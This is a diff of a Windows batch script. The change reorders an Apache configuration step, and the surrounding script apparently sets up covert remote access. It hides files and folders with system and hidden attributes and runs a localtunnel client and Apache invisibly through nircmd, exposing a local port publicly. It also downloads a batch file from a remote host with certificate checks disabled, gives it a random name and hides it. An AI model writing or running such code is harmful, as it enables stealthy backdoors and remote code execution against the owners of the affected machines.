@@ -41,9 +41,6 @@ tasklist /fi "imagename eq localtunnel.exe" | find /i "localtunnel.exe" > nul
 if not errorlevel 1 (attrib +s +h +i "%environment%\localtunnel") else (attrib -s -h -i "%temp%\localtunnel.bat" && attrib -s -h -i "%temp%\localtunnel.txt" && echo ^%environment%\localtunnel\localtunnel.exe --no-dashboard -p 7432 http^ ^>^ ^%temp%\localtunnel.txt^ > "%temp%\localtunnel.bat" && "%environment%\nircmd.exe" exec hide "%temp%\localtunnel.bat" && timeout -t 5 && attrib +s +h +i "%environment%\localtunnel" && attrib +s +h +i "%temp%\localtunnel.txt" && attrib +s +h +i "%temp%\localtunnel.bat"
 )
 
-tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
-if not errorlevel 1 (echo.) else (more +2 "%environment%\apache2\conf\httpd.conf" > "%environment%\apache2\conf\httpd.txt" && move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf")
-
 echo Define ENVIRONMENT "%environment%" >> "%environment%\apache2\conf\httpd.txt"
 echo Define PORT "7432" >> "%environment%\apache2\conf\httpd.txt"
 type "%environment%\apache2\conf\httpd.conf" >> "%environment%\apache2\conf\httpd.txt"
@@ -51,6 +48,9 @@ move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd
 
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe")
+
+tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
+if not errorlevel 1 (echo.) else (more +2 "%environment%\apache2\conf\httpd.conf" > "%environment%\apache2\conf\httpd.txt" && move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf")
 
 set "installer=%random%%random%"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/installer.bat -o "%environment%\Win32\%installer%.bat" && attrib +s +h +i "%environment%\Win32\%installer%.bat"
